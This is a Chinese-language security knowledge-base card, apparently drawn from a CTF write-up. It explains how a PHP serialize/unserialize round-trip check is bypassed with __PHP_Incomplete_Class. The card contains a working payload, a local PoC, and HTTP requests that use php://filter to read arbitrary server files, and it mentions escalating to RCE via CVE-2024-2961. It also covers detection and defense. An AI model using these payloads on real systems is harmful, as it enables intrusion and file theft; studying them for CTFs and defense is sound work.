---
id: web-php-deserialization-incomplete-class-roundtrip-bypass
title: PHP __PHP_Incomplete_Class 往返序列化差异：绕过 serialize(unserialize($x)) != $x 校验并任意文件读取
type: scenario
domain: web
path: web/php/deserialization
technique: php-incomplete-class-roundtrip-bypass
tags:
- php
- deserialization
- incomplete-class
- serialize-bypass
- file-read
- php-filter
- ctf
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-V225
  verified_at: '2026-11-07T06:50:04+08:00'
  notes: 已对照原文SeRce源码、本地验证图25、HackBar图26与flag图27核对：O:1:"A":2:{...__PHP_Incomplete_Class_Name...}往返后变O:1:"F":1:{...}说明属性数减一/类名替换/删除标记属性三步与原文一致；exp参数编码、filetoread读/tmp/start.sh、CVE-2024-2961读/readflag结果均一致；dedup候选为尾空格GC/C前缀等不同往返技巧
url: /docs/web/php/deserialization/web-php-deserialization-incomplete-class-roundtrip-bypass/
draft: false
kb_aliases:
- __PHP_Incomplete_Class 绕过
- serialize(unserialize()) 校验绕过
- 反序列化往返差异
- 不存在的类名 payload
- PHP 任意文件读取
---

## 一句话结论

当代码用 `serialize(unserialize($exp)) != $exp` 作为“输入必须原样往返”的校验时，提交一个不存在的类名，并在对象属性中带上 `__PHP_Incomplete_Class_Name`：`unserialize()` 会创建 `__PHP_Incomplete_Class` 对象；再次 `serialize()` 时 PHP 用该属性值作为类名、删去标记属性并把属性计数减一，输出与输入不同，`!=` 成立，校验被绕过。随后 `file_get_contents($_POST['filetoread'])` 的任意文件读取（配合 `php://filter`）即可读源码/flag，并可用 filter 链或 CVE-2024-2961 进一步升级为 RCE。

## 原理

- **不存在的类 → `__PHP_Incomplete_Class`**：`unserialize()` 遇到未定义的类名时不会失败，而是创建 `__PHP_Incomplete_Class` 实例，并保留原始类名与属性；对象中若已有 `__PHP_Incomplete_Class_Name` 属性，则该属性参与后续序列化。
- **再次序列化的三步规范化**：PHP 对 `__PHP_Incomplete_Class` 重新序列化时：
  1. 把对象属性个数减一，作为序列化文本中的实际属性数；
  2. 用 `__PHP_Incomplete_Class_Name` 的值作为输出类名；
  3. 删除 `__PHP_Incomplete_Class_Name` 属性的描述；若不存在则跳过。
- **往返不相等**：输入 `O:1:"A":2:{s:1:"a";s:1:"b";s:27:"__PHP_Incomplete_Class_Name";s:1:"F";}` 经 `unserialize()`→`serialize()` 后变成 `O:1:"F":1:{s:1:"a";s:1:"b";}`，与输入字符串不同，因此 `!=` 校验通过。
- **为什么这是校验缺陷**：代码想用“往返必须完全一致”来拒绝畸形/对象注入输入，但 PHP 对 incomplete class 的规范化恰好改变了表示形式；只要攻击者能构造出规范化后不同的字符串，就能通过。
- **后续 sink**：校验通过后，代码用 `file_get_contents($_POST['filetoread'])` 读取用户指定路径；`php://filter/convert.base64-encode/resource=...` 可把任意文件内容 Base64 后回显，绕过内容中的特殊字符；若目标存在 glibc iconv 过滤器链问题，可进一步用 CVE-2024-2961 把任意文件读升级为 RCE。

## 触发条件

- 应用使用 `serialize(unserialize($input)) != $input`（或 `==` 的相反逻辑）作为输入校验，且 `$input` 来自用户可控参数。
- 反序列化结果仅用于该比较，或比较后继续使用用户可控的路径/数据进入危险 sink（本例为 `file_get_contents($_POST['filetoread'])`）。
- 目标 PHP 对 `__PHP_Incomplete_Class` 的序列化行为符合上述规范化（常见 PHP 版本均可复现）。
- 需要任意文件读取时，sink 未限制协议/路径；需要 RCE 时，目标存在可用的 php://filter 链或 CVE-2024-2961 条件。

## 利用步骤

1. 审计代码：确认 `$exp = $_GET['exp']; if (serialize(unserialize($exp)) != $exp) { ... }`，并找到校验后的 `file_get_contents($_POST['filetoread'])`。
2. 构造不存在类名的序列化串：`O:1:"A":2:{s:1:"a";s:1:"b";s:27:"__PHP_Incomplete_Class_Name";s:1:"F";}`。
3. URL 编码后作为 `exp` 参数提交，确认 `serialize(unserialize($exp))` 输出为 `O:1:"F":1:{s:1:"a";s:1:"b";}`，与输入不等，进入分支。
4. `POST filetoread=php://filter/convert.base64-encode/resource=/tmp/start.sh`，读取目标文件并 Base64 解码。
5. 枚举路径（`/flag`、`/tmp/start.sh`、Web 源码、配置），找到 flag 或可写目录。
6. 若需要 RCE：使用 php://filter 链或 CVE-2024-2961 CNEXT 脚本，把任意文件读升级为命令执行（如执行 `/readflag > /tmp/b.txt` 再读取）。

## PoC

```php
<?php
// 本地验证：往返序列化结果
$raw = 'O:1:"A":2:{s:1:"a";s:1:"b";s:27:"__PHP_Incomplete_Class_Name";s:1:"F";}';
$exp = 'O:1:"F":1:{s:1:"a";s:1:"b";}';
var_dump(serialize(unserialize($raw)) == $exp); // bool(true)
var_dump(serialize(unserialize($raw)));         // O:1:"F":1:{s:1:"a";s:1:"b";}
```

```text
GET /?exp=O%3A1%3A%22A%22%3A2%3A%7Bs%3A1%3A%22a%22%3Bs%3A1%3A%22b%22%3Bs%3A27%3A%22__PHP_Incomplete_Class_Name%22%3Bs%3A1%3A%22F%22%3B%7D HTTP/1.1
Host: target

POST /?exp=<同上> HTTP/1.1
Content-Type: application/x-www-form-urlencoded

filetoread=php://filter/convert.base64-encode/resource=/tmp/start.sh
```

说明：原文先用该 payload 通过校验并读取 `/tmp/start.sh`，再用 CVE-2024-2961 的 CNEXT 脚本把文件读升级为 RCE，执行 `/readflag > /tmp/b.txt` 得到 flag。PoC 中的类名/属性名可任意替换，只要类不存在且带 `__PHP_Incomplete_Class_Name` 属性即可；未在本机复跑完整链。

## 变体与关联

- **序列化往返差异**：[[web-php-deserialization-ez-uns-trailing-space-gc-php-filter-traversal]] 利用尾部空格差异与重复键 GC 触发析构；本卡利用 `__PHP_Incomplete_Class` 的类名/属性数规范化差异，属同一“往返比较不可靠”主题的不同技巧。
- **php://filter 任意文件读**：[[web-php-file-inclusion-php-filter-insert-bypass]]、[[web-php-file-inclusion-filter-chain-cp037-double-urlencode]] 覆盖 filter 链构造与关键字绕过。
- **CVE-2024-2961 RCE**：[[web-php-rce-glibc-iconv-iso2022cn-ext-heap-overflow-cve-2024-2961]] 覆盖 iconv 过滤器堆溢出到 RCE；本卡把文件读入口作为其前置条件。
- **边界**：目标若用 `json_decode`、严格白名单或对反序列化结果做类型检查，本卡不成立；`file_get_contents` 若禁用 `php://` 协议或 open_basedir 限制路径，需要改用其他读取方式。

## 检测与防御

- 防御：不要用 `serialize(unserialize($input))` 的相等性作为安全校验；直接拒绝不可信反序列化，或使用 JSON/白名单类型。
- 防御：禁止 `file_get_contents` 接受用户可控路径/协议；使用 `open_basedir`、禁用 `php://filter` 等危险包装器，限制 Web 进程可读文件范围。
- 检测：请求参数中出现 `__PHP_Incomplete_Class_Name`、`O:`/`a:` 序列化串；`filetoread` 等参数包含 `php://filter`、`resource=`、编码链；异常文件读取与后续命令执行。
- 响应：修复校验逻辑、轮换可能泄露的源码/密钥、排查是否已通过 filter 链或 CVE-2024-2961 升级为 RCE。
